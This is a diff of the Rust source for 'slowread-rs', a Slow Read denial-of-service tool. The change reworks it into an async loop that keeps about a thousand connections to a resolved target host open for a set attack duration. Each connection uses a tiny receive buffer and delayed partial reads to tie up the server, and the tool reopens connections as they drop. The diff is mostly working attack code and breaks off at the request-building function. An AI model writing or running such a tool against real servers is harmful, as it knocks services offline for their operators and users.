@@ -8,25 +8,28 @@ extern crate tokio_timer;
 extern crate tokio_tls;
 extern crate trust_dns_resolver;
 
-use futures::future::join_all;
-use futures::future::{loop_fn, Future, Loop};
+use futures::future::{loop_fn, Future, Loop, ok};
+use futures::stream::Stream;
 use http::Request;
-use native_tls::TlsConnector;
+use tokio::spawn;
 use std::net::IpAddr;
 use std::net::SocketAddr;
-use std::time::Duration;
+use std::sync::{
+    atomic::{AtomicUsize, Ordering},
+    Arc,
+};
+use std::time::{Duration, Instant};
 use structopt::StructOpt;
 use tokio::io;
 use tokio::net::TcpStream;
-use tokio_timer::Timer;
-use tokio_timer::TimerError;
+use tokio::timer::{Delay, Deadline, Interval};
 use trust_dns_resolver::Resolver;
 
 #[derive(StructOpt, Debug)]
 #[structopt(name = "slowread-rs")]
 struct Options {
-    #[structopt(short = "a", long = "address")]
-    address: String,
+    #[structopt(short = "a", long = "address", parse(from_str = "lookup_ip"))]
+    address: SocketAddr,
 
     #[structopt(short = "p", long = "path", default_value = "/")]
     path: String,
@@ -42,118 +45,165 @@ struct Options {
     #[structopt(short = "r", long = "read-len", default_value = "5")]
     read_len: usize,
 
-    #[structopt(short = "c", long = "connections", default_value = "10000")]
+    #[structopt(short = "c", long = "connections", default_value = "1000")]
     connections: usize,
 
     #[structopt(
-        short = "w", long = "wait-time", default_value = "55000", parse(from_str = "parse_duration")
+        short = "w", long = "wait-time", default_value = "1", parse(from_str = "parse_duration")
     )]
     wait_time: Duration,
+
+    #[structopt(
+        short = "d",
+        long = "attack-duration",
+        default_value = "300",
+        parse(from_str = "parse_duration")
+    )]
+    attack_duration: Duration,
 }
 
 fn parse_duration(src: &str) -> Duration {
-    let millis: u64 = src.parse().unwrap();
-    Duration::from_millis(millis)
+    let secs: u64 = src.parse().unwrap();
+    Duration::from_secs(secs)
 }
 
 fn parse_recv_buffer_size(src: &str) -> usize {
     src.parse::<usize>().unwrap() / 2
 }
 
-fn main() {
-    let options = Options::from_args();
-    println!("{:?}", options);
+fn lookup_ip(address: &str) -> SocketAddr {
+    let port = if address.starts_with("https://") {
+        443
+    } else {
+        80
+    };
 
     let resolver = Resolver::from_system_conf().unwrap();
-    let response = resolver.lookup_ip(&options.address);
+    let response = resolver.lookup_ip(address.split("://").last().unwrap());
 
     if response.is_err() {
         let error = response.unwrap_err();
-        println!(
+        panic!(
             "Error resolving address \"{}\". \n{}\nAborting execution...",
-            options.address, error
+            address, error
         );
-        return;
     }
 
     let ip_addr_option: Option<IpAddr> = response.unwrap().iter().next();
 
     if ip_addr_option.is_none() {
-        println!(
+        panic!(
             "The address \"{}\" resolved to zero IP addresses. Aborting exeuction...",
-            options.address
+            address
         );
-        return;
     }
 
-    let socket_addr = SocketAddr::new(ip_addr_option.unwrap(), 443);
-    let url: String = "https://".to_owned() + &socket_addr.ip().to_string() + ":"
-        + &socket_addr.port().to_string();
+    SocketAddr::new(ip_addr_option.unwrap(), port)
+}
 
-    let mut futures = vec![];
+fn create_url(address: &SocketAddr) -> String {
+    let protocol = match address.port() {
+        443 => "https://",
+        80 => "http://",
+        _ => panic!("Unknown port {}.", address.port()),
+    };
 
-    let connector = TlsConnector::builder().unwrap().build().unwrap();
-    let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();
+    protocol.to_owned() + &address.ip().to_string() + ":" + &address.port().to_string()
+}
 
-    tcp_stream
-        .set_recv_buffer_size(options.recv_buffer_size)
-        .unwrap();
+fn main() {
+    let options = Options::from_args();
 
-    println!("Changing buffer size to {} bytes", options.recv_buffer_size);
-    println!(
-        "Buffer size actually changed to {} bytes",
-        tcp_stream.recv_buffer_size().unwrap()
-    );
+    let url = create_url(&options.address);
 
-    let mut tcp_stream = connector.connect(&options.address, tcp_stream).unwrap();
+    println!("Connecting to \"{}\"", url);
 
-    tcp_stream.shutdown().unwrap();
+    tokio::run(launch_attacks(url, options));
+}
 
-    for _ in 0..options.connections {
-        futures.push(launch_attack(&socket_addr, &url, &options));
-    }
+fn launch_attacks(
+    url: String,
+    options: Options,
+    )-> impl Future<Item = (), Error = ()> {
 
-    join_all(futures).wait().unwrap();
+    let open_connections = Arc::new(AtomicUsize::new(0));
+    let attack_duration = options.attack_duration;
+    let start_time = Instant::now();
+
+    let interval = 
+        Interval::new(start_time, Duration::from_secs(1))
+        .for_each(move |instant| {
+            let connections_left: i32 = options.connections as i32 - open_connections.load(Ordering::SeqCst) as i32;
+            for _ in 0..connections_left {
+                spawn(launch_attack(
+                    &options.address,
+                    &url,
+                    &options,
+                    open_connections.clone(),
+                    ));
+            }
+
+            print_stats(instant.duration_since(start_time).as_secs(), &open_connections);
+
+            ok(())
+        });
+
+    Deadline::new(interval, Instant::now() + attack_duration)
+        .map_err(|_| ())
+}
+
+fn print_stats(secs_since_start: u64, open_connections: &Arc<AtomicUsize>) {
+            println!("Time: {}s\nOpen connections: {}\n\n\n", secs_since_start, open_connections.load(Ordering::SeqCst));
 }
 
 fn launch_attack(
     socket_addr: &SocketAddr,
     url: &str,
     options: &Options,
-) -> impl Future<Item = (Option<TcpStream>, Vec<u8>), Error = TimerError> {
-    let wait_time = options.wait_time.clone();
+    open_connections: Arc<AtomicUsize>,
+) -> impl Future<Item = (), Error = ()> {
+    let wait_time = options.wait_time;
     let path = &options.path;
     let read_len = options.read_len;
-
-    let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();
-
-    tcp_stream
-        .set_recv_buffer_size(options.recv_buffer_size)
-        .unwrap();
+    let recv_buffer_size = options.recv_buffer_size;
 
     let request = Request::get(url.to_owned() + path).body(()).unwrap();
     let request = build_http_request(&request);
 
-    io::write_all(&tcp_stream, request).wait().unwrap();
+    TcpStream::connect(&socket_addr)
+        .map_err(|_| ())
+        .and_then(move |tcp_stream| {
+            open_connections.fetch_add(1, Ordering::SeqCst);
 
-    let buf: Vec<u8> = Vec::with_capacity(read_len);
+            tcp_stream
+                .set_recv_buffer_size(recv_buffer_size)
+                .unwrap();
 
-    let (tcp_stream, buf) = io::read_exact(tcp_stream, buf).wait().unwrap();
+            io::write_all(tcp_stream, request)
+                .map_err(|_| ())
 
-    loop_fn((Some(tcp_stream), buf), move |(tcp_stream_option, _buf)| {
-        let tcp_stream = tcp_stream_option.unwrap();
-
-        Timer::default().sleep(wait_time).and_then(move |_| {
+        }).and_then(move |(tcp_stream, _buf)| {
             let buf: Vec<u8> = Vec::with_capacity(read_len);
-
             io::read_exact(tcp_stream, buf)
-                .and_then(|(tcp_stream, buf)| Ok(Loop::Continue((Some(tcp_stream), buf))))
-                .or_else(move |_| {
-                    let buf: Vec<u8> = Vec::with_capacity(read_len);
-                    Ok(Loop::Break((None, buf)))
-                })
+                .map_err(|_| ())
+
+        }).and_then(move |(tcp_stream, _buf)| {
+            loop_fn(tcp_stream, move |tcp_stream| {
+                let buf: Vec<u8> = Vec::with_capacity(read_len);
+
+                io::read_exact(tcp_stream, buf)
+                    .then(move |res| {
+                        let (wait_time, value) = match res {
+                            Err(_) => (Duration::from_secs(1), ok(Loop::Break(()))),
+                            Ok((tcp_stream, _)) => (wait_time, ok(Loop::Continue(tcp_stream)))
+                        };
+
+                        Delay::new(Instant::now() + wait_time)
+                            .map_err(|_| ())
+                            .and_then(|_| value)
+                    })
+            })
         })
-    })
 }
 
 fn build_http_request(request: &Request<()>) -> String {
